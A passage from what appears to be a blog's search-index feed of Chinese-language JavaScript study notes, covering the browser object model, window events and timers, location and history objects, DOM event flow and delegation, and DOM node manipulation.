        <content type="html"><![CDATA[<h4 id="1.什么是bom">1.什么是BOM<a title="#1.什么是bom" href="#1.什么是bom"></a></h4><p>BOM（Browser Object Model）浏览器对象模型，它提供了独立于内容而与浏览器窗口进行交互的对象，其核心对象是 window</p><p>BOM 由一系列相关的对象构成，并且每个对象都提供了很多方法和属性。</p><h4 id="2.-与dom相比">2. 与DOM相比<a title="#2.-与dom相比" href="#2.-与dom相比"></a></h4><ul><li>DOM<ul><li>文档对象模型</li><li>DOM 就是把文档当作一个对象来看待</li><li>DOM 的顶级对象就是 document</li><li>DOM 主要学习的是操作页面元素</li><li>DOM 是 W3C 标准规范</li></ul></li><li>BOM<ul><li>浏览器对象模型</li><li>把浏览器当作一个对象看待</li><li>BOM 的顶级对象是  window</li><li>DOM 学习的是浏览器窗口交互的一些对象</li><li>BOM 是浏览器厂商再各自浏览器上定义的，兼容性差</li></ul></li></ul><h4 id="3.bom-的构成">3.BOM 的构成<a title="#3.bom-的构成" href="#3.bom-的构成"></a></h4><ul><li>document</li><li>location</li><li>navigation</li><li>screen</li><li>history</li></ul><p>window 对象是浏览器的顶级对象，具有：</p><ol><li>是js访问浏览器窗口的一个接口</li><li>是一个全局对象，定义在全局作用域中的变量、函数都会变成 window对象的属性和方法</li></ol><p>在调用时可以省略window</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js window对象常见事件</title>
      <link href="/learningNotes/js/09%20window%E5%AF%B9%E8%B1%A1"/>
      <url>/learningNotes/js/09%20window%E5%AF%B9%E8%B1%A1</url>
      
        <content type="html"><![CDATA[<h3 id="1.-窗口加载事件：onload、domcontentloaded">1. 窗口加载事件：onload、DOMContentLoaded<a title="#1.-窗口加载事件：onload、domcontentloaded" href="#1.-窗口加载事件：onload、domcontentloaded"></a></h3><p><code>onload</code>: 当文档内容完全加载完成时会触发该事件（包括图像、脚本、css、文件等），就调用的处理函数</p><p><code>DOMContentLoaded</code>: 此事件触发时，仅当DOM加载完成，不包括样式表、图片、flash等等   ie9+</p><blockquote><p>页面图片很多，从用户访问到onload触发可能需要较长的时间，交互效果就不能实现，此时用DOMContentLoaded比较合适 ，速度较快</p></blockquote><p>触发方式：</p><ul><li>传统：<code>window.onload=function()&#123;&#125;</code>  只能写一次  多次 以最后一个为准</li><li>监听：<code>window.addEventListener(&quot;load&quot;,function()&#123;&#125;);</code> 没有次数限制</li></ul><h3 id="2.-调整窗口大小事件:-onresize">2. 调整窗口大小事件: onresize<a title="#2.-调整窗口大小事件:-onresize" href="#2.-调整窗口大小事件:-onresize"></a></h3><p>只要窗口发生像素变化就会触发这个事件|  利用此完成响应式布局</p><h3 id="3.-定时器：settimeout、setinterval">3. 定时器：setTimeout、setInterval<a title="#3.-定时器：settimeout、setinterval" href="#3.-定时器：settimeout、setinterval"></a></h3><ul><li><p><code>window.setTimeout(调用函数，[延迟的毫秒数])</code>  : 该定时器再定时器到期后执行调用函数</p><ul><li>window可以省略</li><li>这个调用函数可以   直接写函数  或者  写函数名  或者  采取字符串’函数名()’ 。第三种不推荐</li><li>延迟的毫秒数省略默认是，单位是毫秒</li><li>因为定时器可能有很多，所以经常给定时器赋值一个标识符</li><li>这个函数需要等待时间，时间到了才去调用这个函数，因此称回调函数</li></ul></li><li><p><code>window.clearTimeout(timeout ID)</code>：停止setTimeout()定时器：</p><ul><li>window可以省略   里面的参数就是定时器的标识符</li></ul></li><li><p><code>window.setInterval(回调函数，[间隔的毫秒数])</code>: 方法重复调用一个函数 ，每隔这个时间  就去调用一次回调函数</p><ul><li>window可以省略</li><li>这个调用函数可以    直接写函数  或者  写函数名  或者  采取字符串’函数名()’  三种形式</li><li>延迟的毫秒数省略默认是0，if写，必须是毫秒</li><li>因为定时器可能有很多，所以经常给定时器赋值一个标识符</li></ul></li><li><p><code>window.clearInterval(interval ID)</code>: 停止setInterval()定时器</p><ul><li>window可以省略   里面的参数就是定时器的标识符</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js loaction、navigator、history对象概述</title>
      <link href="/learningNotes/js/10%20location%E5%AF%B9%E8%B1%A1"/>
      <url>/learningNotes/js/10%20location%E5%AF%B9%E8%B1%A1</url>
      
        <content type="html"><![CDATA[<h3 id="1.-location对象">1. location对象<a title="#1.-location对象" href="#1.-location对象"></a></h3><h4 id="1.1-概述">1.1 概述<a title="#1.1-概述" href="#1.1-概述"></a></h4><p>用于获取或设置窗体的 url，并且可以用于解析url，应为返回的是一个对象，所以我们将这个属性也称为location对象。</p><h4 id="1.2-url-概述">1.2 url 概述<a title="#1.2-url-概述" href="#1.2-url-概述"></a></h4><p>统一资源定位器，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的url，它包含的信息指出文件的位置以及浏览器怎么处理它</p><p>一般语法为：<code>protocol：//host[ : port]/path/[?query]#fragment </code></p><ul><li><code>http://www.itcast.c/index.html?name=andy&amp;age=18#link</code></li><li>通信协议 — 常用http、ftp、maito</li><li>主机（域名）— <a href="http://www.iteima.com">www.iteima.com</a></li><li>端口号 —  可选，省略时使用方案的默认端口  如http的为80</li><li>路径 — 由0或多个/隔开的字符串  一般用来表示主机上的一个目录或文件地址</li><li>参数 — 以键值对的形式  通过&amp;分隔开来</li><li>片段 — #后面内容 常见于两节  锚点</li></ul><h4 id="1.3-location-对象的属性">1.3 location 对象的属性<a title="#1.3-location-对象的属性" href="#1.3-location-对象的属性"></a></h4><ul><li><code>location.href </code> —  获取或设置整个url</li><li><code>location.host</code> —  返回主机（域名）</li><li><code>location.port</code> — 返回端口号   if未写返回  得空字符串</li><li><code>location.pathname</code> — 返回路径</li><li><code>location.search</code> — 返回参数</li><li><code>location.hash</code> — 返回片段</li></ul><h4 id="1.4-location-对象的方法">1.4 location 对象的方法<a title="#1.4-location-对象的方法" href="#1.4-location-对象的方法"></a></h4><ul><li><code>location.assign()</code>    跟href一样 可以跳转页面（重定向页面） 能后退</li><li><code>location.replace()</code>  替换当前页面  不记录历史 不能后退</li><li><code>location.reload()</code>    重新加载页面 相当于刷新按钮或者f5 if参数为true 强之刷新  ctrl+5</li></ul><h3 id="2.navigator对象">2.navigator对象<a title="#2.navigator对象" href="#2.navigator对象"></a></h3><p>包含有关浏览器的信息，它由很多属性，我们最常用的是userAgent，该属性可以返回由客户机发送服务器的use-agent头部的值</p><p>以下前端代码可以判断用户那个终端打开页面 实现跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((navigator.<span class="property">userAgent</span>.<span class="title function_">match</span>(<span class="regexp">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|Webos|Symbian|Windows Phone)/i</span>)))&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;(页面地址)&quot;</span>;  <span class="comment">//手机</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;&quot;</span>; <span class="comment">//电脑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.-history对象">3. history对象<a title="#3.-history对象" href="#3.-history对象"></a></h3><p>与历史记录进行交互，该对象包含用户（在浏览器窗口中）访问过的url</p><ul><li>back()      可以后退功能</li><li>forward() 前进功能</li><li>go(参数)   前进后退功能  参数是1  前进一个页面  如果是-1  后退1个页面</li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js获取元素</title>
      <link href="/learningNotes/js/05DOM%E4%BA%8B%E4%BB%B6%E6%B5%81"/>
      <url>/learningNotes/js/05DOM%E4%BA%8B%E4%BB%B6%E6%B5%81</url>
      
        <content type="html"><![CDATA[<h3 id="dom事件流">DOM事件流<a title="#dom事件流" href="#dom事件流"></a></h3><p>html中的标签都是相互嵌套的，我们可以将元素想象成一个盒子装一个盒子，document是最外面的大盒子。 当你单击一个div时，同时你也单击了div的父元素，甚至整个页面。</p><blockquote><p>那么是先执行父元素的单击事件，还是先执行div的单击事件 ？？？</p></blockquote><p>其实：</p><p>事件流 描述的是从页面中接收事件的顺序；</p><p>事件 发生时会在元素节点之间按照待定的顺序传播，这个传播过程就是 DOM 事件流</p><blockquote><p>比如：我们给页面中的一个div注册了单击事件，当你单击了div时，也就单击了body，单击了html，单击了document。</p></blockquote><img src="https://s1.328888.xyz/2022/04/09/X1ZDZ.png"><h4 id="事件冒泡：">事件冒泡：<a title="#事件冒泡：" href="#事件冒泡："></a></h4><p>IE最早提出，事件开始时由最具体的元素接收，然后逐级向上传播到 DOM 最顶层节点的过程</p><h4 id="事件捕获：">事件捕获：<a title="#事件捕获：" href="#事件捕获："></a></h4><p>网景最早提出，由DOM最顶层节点开始，然后逐层向下传播到最具体的元素接收的过程</p><blockquote><p>当时的2大浏览器霸主谁也不服谁！</p><p>IE 提出从目标元素开始，然后一层一层向外接收事件并响应，也就是冒泡型事件流。</p><p>Netscape（网景公司）提出从最外层开始，然后一层一层向内接收事件并响应，也就是捕获型事件流。</p><p>最终，w3c 采用折中的方式，平息了战火，制定了统一的标准 —–— 先捕获再冒泡。</p><p>现代浏览器都遵循了此标准，所以当事件发生时，会经历3个阶段。</p></blockquote><h4 id="dom-事件流会经历3个阶段：">DOM 事件流会经历3个阶段：<a title="#dom-事件流会经历3个阶段：" href="#dom-事件流会经历3个阶段："></a></h4><ol><li><p>捕获阶段</p></li><li><p>当前目标阶段</p></li><li><p>冒泡阶段</p></li></ol><blockquote><p>我们向水里面扔一块石头，首先它会有一个下降的过程，这个过程就可以理解为从最顶层向事件发生的最具体元素（目标点）的捕获过程；之后会产生泡泡，会在最低点（ 最具体元素）之后漂浮到水面上，这个过程相当于事件冒泡。</p></blockquote> <img src="https://s1.328888.xyz/2022/04/09/X1j3C.png"><img src="https://s1.328888.xyz/2022/04/09/X1vEg.png" style="float:left">]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js事件</title>
      <link href="/learningNotes/js/06%E6%B3%A8%E5%86%8C%E5%88%A0%E9%99%A4%E4%BA%8B%E4%BB%B6"/>
      <url>/learningNotes/js/06%E6%B3%A8%E5%86%8C%E5%88%A0%E9%99%A4%E4%BA%8B%E4%BB%B6</url>
      
        <content type="html"><![CDATA[<h3 id="1注册事件（绑定事件）">1注册事件（绑定事件）<a title="#1注册事件（绑定事件）" href="#1注册事件（绑定事件）"></a></h3><h4 id="1.1-给元素添加事件">1.1 给元素添加事件<a title="#1.1-给元素添加事件" href="#1.1-给元素添加事件"></a></h4><ul><li><p>传统方式:</p><p>利用on开头的事件/onclick: <code>btn.onclick=function()&#123;&#125;</code></p><blockquote><p>特点：</p><p>注册事件唯一性  （同一个元素上下点击alert，之hi显示后面的那个）<br>同一个元素同一个事件只能设置一个处理函数，最后注册的处理函数将会覆盖前面注册书的处理函数</p></blockquote></li><li><p>监听方式<br>方法监听注册方式：<code>addEventListener()</code> w3c标准</p><blockquote><p>特点：</p><p>同一个元素同一个事件可以注册多个监听器<br>按注册顺序依次执行上</p></blockquote></li></ul><h4 id="1.2-事件监听方式：">1.2 事件监听方式：<a title="#1.2-事件监听方式：" href="#1.2-事件监听方式："></a></h4><p><code>eventTarget.addEventListener(type,listener[,useCapture])</code><br>将指定的监听器注册到eventTarget（目标对象），当该对象触发指定事件时，就会执行事件处理程序</p><ul><li>type：事件类型字符串，比如click、mouseover，这里不带on  ＋引号</li><li>listener：事件处理函数，事件发生时，会调用该监听函数</li><li>useCapture：可选参数，是一个布尔值，默认时false。</li></ul><h4 id="1.3.attachevent事件监听方式">1.3.attachEvent事件监听方式<a title="#1.3.attachevent事件监听方式" href="#1.3.attachevent事件监听方式"></a></h4><p><code>eventTarget.attachEvent(eventNameWithOn,callback)</code><br>将指定的监听器注册到eventTarget（目标对象上），当该对象触发指定事件时，就会执行事件处理程序</p><ul><li>eventNameWithOn：事件类型字符串，比如onclick，这里带on</li><li>callback：事件处理函数，当目标触发事件时回调函数被调用</li><li>ie9以前的版本支持</li></ul><h3 id="2.删除事件">2.删除事件<a title="#2.删除事件" href="#2.删除事件"></a></h3><h3 id="2.1事件删除的方式">2.1事件删除的方式<a title="#2.1事件删除的方式" href="#2.1事件删除的方式"></a></h3><ul><li>传统注册方式：<code>eventTarget.onclick=null</code></li><li>监听注册方式：<ul><li><code>eventTarget.removeEventListener(type,listener[,useCapture]);</code></li><li><code>eventTarget.detachEvent(eventNameWithOn,callback);</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js获取元素</title>
      <link href="/learningNotes/js/07%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1"/>
      <url>/learningNotes/js/07%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1</url>
      
        <content type="html"><![CDATA[<h3 id="1.-dom事件流">1. DOM事件流<a title="#1.-dom事件流" href="#1.-dom事件流"></a></h3><p>dom 事件流 三个阶段：</p><ol><li><p>JS 代码中只能执行捕获或者冒泡其中的一个阶段。</p></li><li><p>onclick 和 attachEvent（ie） 只能得到冒泡阶段。</p></li><li><p>捕获阶段 如果addEventListener 第三个参数是 true 那么则处于捕获阶段</p><blockquote><p>document -&gt; html -&gt; body -&gt; father -&gt; son</p></blockquote></li><li><p>冒泡阶段 如果addEventListener 第三个参数是 false 或者 省略 那么则处于冒泡阶段</p><blockquote><p>son -&gt; father -&gt;body -&gt; html -&gt; document</p></blockquote></li></ol><h3 id="2.-事件对象">2. 事件对象<a title="#2.-事件对象" href="#2.-事件对象"></a></h3><ol><li><p>event就是一个事件对象 <code>div.onclick=function(event)&#123;&#125; |div.addEventListenter('click',function(event) &#123;&#125; ) </code></p></li><li><p>事件对象只有有了事件才会存在，是系统给我们自动创建的</p></li><li><p>事件对象  是 事件的一系列相关数据的集合  跟事件相关的</p><blockquote><p>（eg：鼠标点击  包含鼠标坐标。。。  if键盘事件  包含按下哪个键）</p></blockquote></li><li><p>这个事件对象可以自己命名，比如event-&gt;e</p></li><li><p>兼容性  ie678  <code>window.event</code></p></li></ol><h3 id="3.-事件对象常见的属性和方法">3. 事件对象常见的属性和方法<a title="#3.-事件对象常见的属性和方法" href="#3.-事件对象常见的属性和方法"></a></h3><div class="φbq"><div class="φbs"><table><thead><tr><th>属性|方法</th><th>行为</th><th>标准</th></tr></thead><tbody><tr><td>e.target</td><td>返回   触发  事件的对象</td><td>标准</td></tr><tr><td>e.srcElement</td><td>返回   触发  事件的对象</td><td>非标准  ie678使用</td></tr><tr><td>e.type</td><td>返回时间的类型</td><td></td></tr><tr><td>e.cancelBubble</td><td>阻止冒泡</td><td>非标准  ie678使用</td></tr><tr><td>e.stopPropagation()</td><td>阻止冒泡</td><td>标准</td></tr><tr><td>e.reutrnValue</td><td>阻止默认事件/行为</td><td>非标准  ie678使用</td></tr><tr><td>e.preventDefault()</td><td>阻止默认事件/行为</td><td>标准</td></tr></tbody></table></div></div><h3 id="4.-事件委托（代理/委派）（冒泡好处）：">4. 事件委托（代理/委派）（冒泡好处）：<a title="#4.-事件委托（代理/委派）（冒泡好处）：" href="#4.-事件委托（代理/委派）（冒泡好处）："></a></h3><p>原理：不给每个节点单独是设置事件监听器，而是将事件监听器设置再其父结点上，然后利用冒泡原理影响设置每个子节点<br>作用：只操作了一次DOM，提高了程序的性能</p><p>事件委托的核心原理：给父节点添加侦听器， 利用事件冒泡影响每一个子节点</p><blockquote><p>比如：给ul注册事件，然后利用事件对象的target来找到当前点击的li，以为点击li，事件会冒泡到ul上，ul有注册事件，就会触发监听器</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> ul=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// e.target 这个可以得到我们点击的对象   点哪个哪个背景变色</span></span></span><br><span class="line"><span class="language-javascript">e.<span class="property">target</span>.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&#x27;pink&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5.-常用的鼠标事件">5. 常用的鼠标事件<a title="#5.-常用的鼠标事件" href="#5.-常用的鼠标事件"></a></h3><h4 id="5.1-禁用默认选项（了解）">5.1 禁用默认选项（了解）<a title="#5.1-禁用默认选项（了解）" href="#5.1-禁用默认选项（了解）"></a></h4><ol><li><p>禁止鼠标右键菜单：<code>contextmenu</code>主要控制应该何时显示上下菜单，主要用于程序员取消默认的上下文菜单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;contextmenu&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">e.<span class="title function_">prevetDefault</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>禁止选中文字：<code>selectstart</code> 开始选中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;selectstart&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">e.<span class="title function_">prevetDefault</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="5.2-鼠标事件对象">5.2 鼠标事件对象<a title="#5.2-鼠标事件对象" href="#5.2-鼠标事件对象"></a></h4><p>event对象代表时间的状态，跟事件相关的一系列信息的集合。现阶段主要是鼠标事件MouseEvent 何键盘事件KEyboardEvent</p><ul><li>e.clientX      返回鼠标相对于浏览器窗口可视区的X坐标</li><li>e.clientY      返回鼠标相对于浏览器窗口可视区的Y坐标</li><li>e.pageX      返回鼠标相对于文档页面的X坐标      IE9+支持</li><li>e.pageY      返回鼠标相对于文档页面的Y坐标      IE9+支持</li><li>e.screenX    返回鼠标相对于电脑屏幕的X坐标</li><li>e.screenY    返回鼠标相对于电脑屏幕的Y坐标</li></ul><h3 id="6.常用的键盘事件">6.常用的键盘事件<a title="#6.常用的键盘事件" href="#6.常用的键盘事件"></a></h3><h4 id="6.1键盘事件对象">6.1键盘事件对象<a title="#6.1键盘事件对象" href="#6.1键盘事件对象"></a></h4><ul><li><p>onkeyup      某个键盘按键时被松开时触发</p></li><li><p>onkeydown 某个键盘按键被按下时触发</p></li><li><p>onkeypress  某个键盘按键被按下时  触发   但不识别功能键（ctrl   shift）</p><p>三个事件的顺序：keydowm–keypress–keyup</p></li></ul><blockquote><p>注：keydown和keypress在文本框里的特点：他们两个事件触发时，文字还没有落入文本框中<br>keyup事件触发时，文字就已经落入文本框里了</p></blockquote><h4 id="8.2键盘事件对象">8.2键盘事件对象<a title="#8.2键盘事件对象" href="#8.2键盘事件对象"></a></h4><ul><li>keyCode   返回该键的ASCLL值</li><li>key           返回按下的值</li></ul><blockquote><p>onkeydown  和 onkeyup不区分字母大小写，onkeypress区分字母大小写<br>在实际开发中，我们更多的使用keydown和keyup 它能识别所有的键（包括包括功能键）<br>keypress不识别功能键，但是keyCode属性区分大小写，返回不同的ASCLL值</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js节点操作</title>
      <link href="/learningNotes/js/04%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C"/>
      <url>/learningNotes/js/04%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C</url>
      
        <content type="html"><![CDATA[<blockquote><p>为什么学节点操作：</p><p>通常获取元素是<br>​利用dom提供的方法获取元素：document. getElementById()…   //繁琐逻辑性不强<br>​利用节点层级关系获取元素：父子兄节点关系   //逻辑性强</p></blockquote><h3 id="2.节点概述">2.节点概述<a title="#2.节点概述" href="#2.节点概述"></a></h3><p>便签、属性、文本、注释等都是节点<br>一般地，节点至少有nodeType（节点类型）、nodeName(节点名称)、nodeValue（节点值）</p><ul><li>元素节点   nodeType=1</li><li>属性节点   nodeType=2</li><li>文本节点   nodeType=3（文本节点包含文字、空格、换行等）</li></ul><p>主要操作元素节点</p><h3 id="3.节点层级">3.节点层级<a title="#3.节点层级" href="#3.节点层级"></a></h3><ol><li><p>父级节点：<code>parentNode</code></p><p>得到的是离元素最近的父级节点（亲爸爸）   找不到就返回为null</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">sapn</span> <span class="attr">class</span>=<span class="string">&quot;erweima&quot;</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="keyword">var</span>  erweima=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.erweima&#x27;</span>);</span><br><span class="line"><span class="comment">//var box=document.querySelector(&#x27;.box&#x27;);</span></span><br><span class="line">          <span class="comment">//=erweima.parentNode;</span></span><br><span class="line"><span class="comment">//console.log(box)=console.log(erweima.parentNode)；</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>子节点：</p><ul><li><code>parentNode.childNodes(标准)</code>  //返回所有子节点</li><li><code>parentnode.children(非标准) </code>  //只返回元素节点     是一个只读属性</li></ul><p>兼容性ie9:</p><ul><li><code>parentNode.firstChild | parentNode.lastChild </code>    //返回第一个/最后一个子节点</li><li><code>parentNode.firstElementChild | parentNode.lastElementChild</code>  //返回第一/最后一个元素节点</li><li><code>parentNode.children[0]  | parentNode.children[parentNode.children.length-1]</code>   //实际开发常用</li></ul></li><li><p>兄弟节点</p><ul><li><code>node.nextSibling</code> 返回下一个兄弟节点   包含所有节点</li><li><code>node.previousSibling</code>   返回当前元素上一个兄弟节点   包含所有节点</li></ul><p>兼容性ie9:</p><ul><li><code>node.nextElementSibling</code>   返回当前元素下一个兄弟元素节点</li><li><code>node.previousElementSibling</code>  返回当前元素上一个兄弟元素节点</li></ul></li></ol><h3 id="4.-创建节点">4. 创建节点<a title="#4.-创建节点" href="#4.-创建节点"></a></h3><p><code>document.createElement('tagName')  </code></p><p>方法创建由tagName指定的HTML元素，因为这些元素原先不存在，是根据我们的需求动态生成的，所以我们也称为动态创建元素节点</p><h3 id="5.添加节点">5.添加节点<a title="#5.添加节点" href="#5.添加节点"></a></h3><ul><li><p><code>node.appendChild(child)</code>   node父级     child子级</p><p>将一个节点添加到指定父节点的子节点的子节点列表末尾，类似于css里面的after伪元素</p></li><li><p>node.insertBefore(child,指定元素)</p><p>方法将一个节点添加到父子点的指定子节点前面，类似于css里面的before伪元素</p></li></ul><h3 id="6.删除节点">6.删除节点<a title="#6.删除节点" href="#6.删除节点"></a></h3><ul><li><p><code>node.removeChild(child) </code> 从dom中删除一个字节点  返回删除的节点</p><blockquote><p>阻止链接跳转需要添加javascript:void(0);或者javascript: ;</p></blockquote></li></ul><h3 id="7.复制节点">7.复制节点<a title="#7.复制节点" href="#7.复制节点"></a></h3><ul><li><p><code>node.cloneNode()</code> 返回调用改方法节点的一个副本</p><p>括号参数为空/false  为浅拷贝  只复制节点本身  不克隆里面的子节点（文本）</p></li><li><p><code>node.cloneNode(true)</code></p><p>括号为true 深拷贝 复制标签    复制里面的内容</p></li></ul><h3 id="8.三种动态创建元素的区别">8.三种动态创建元素的区别<a title="#8.三种动态创建元素的区别" href="#8.三种动态创建元素的区别"></a></h3><p>​1. <code>document.write()</code>   页面文档流加载完毕，使用  会使文档流重绘</p><ol start="2"><li><code>element.innerHTML </code></li><li><code>document.createElement()</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 后两个在添加少数时无区别   但多个时</span></span><br><span class="line"><span class="comment">//1. innerHTML:                         3019ms</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> d1=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;   <span class="comment">//拼接</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>+=<span class="string">&#x27;&lt;div  style=&quot;width:100px; height:2px; boder:1px solid blue;&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d2=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d2-d1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//document.createElement()  20+ms</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> d1=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> div=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">style</span>.<span class="property">width</span>=<span class="string">&#x27;100px&#x27;</span>;</span><br><span class="line">div.<span class="property">style</span>.<span class="property">height</span>=<span class="string">&#x27;2px&#x27;</span>;</span><br><span class="line">div.<span class="property">style</span>.<span class="property">border</span>=<span class="string">&#x27;1px solid red&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);    <span class="comment">//创建  